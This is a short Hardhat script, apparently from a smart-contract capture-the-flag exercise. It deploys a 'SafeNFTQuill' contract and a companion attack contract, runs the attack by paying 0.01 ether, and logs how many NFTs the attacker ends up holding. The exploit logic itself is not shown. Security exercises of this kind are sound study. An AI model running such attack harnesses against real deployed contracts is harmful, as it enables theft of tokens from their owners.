import chalk from "chalk";
import { ethers } from "hardhat";
import { SafeNFTQuill__factory, SafeNFTQuill, SafeNFTQuillAttack__factory } from "../../typechain";
import { log, initialize } from "../utils";


async function main() {
    let [safeNFTQuillContract, attacker] = await initialize<SafeNFTQuill>(SafeNFTQuill__factory, undefined, ["quill", "QLL", ethers.parseEther("0.01")]);
    let safeAttack = await new SafeNFTQuillAttack__factory(attacker).deploy();
    await safeAttack.waitForDeployment();

    let tx = await safeAttack.attack(await safeNFTQuillContract.getAddress(), {value: ethers.parseEther("0.01")});
    await tx.wait();
    log(`NFT number: ${chalk.yellow(await safeNFTQuillContract.balanceOf(await safeAttack.getAddress()))}`); 

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});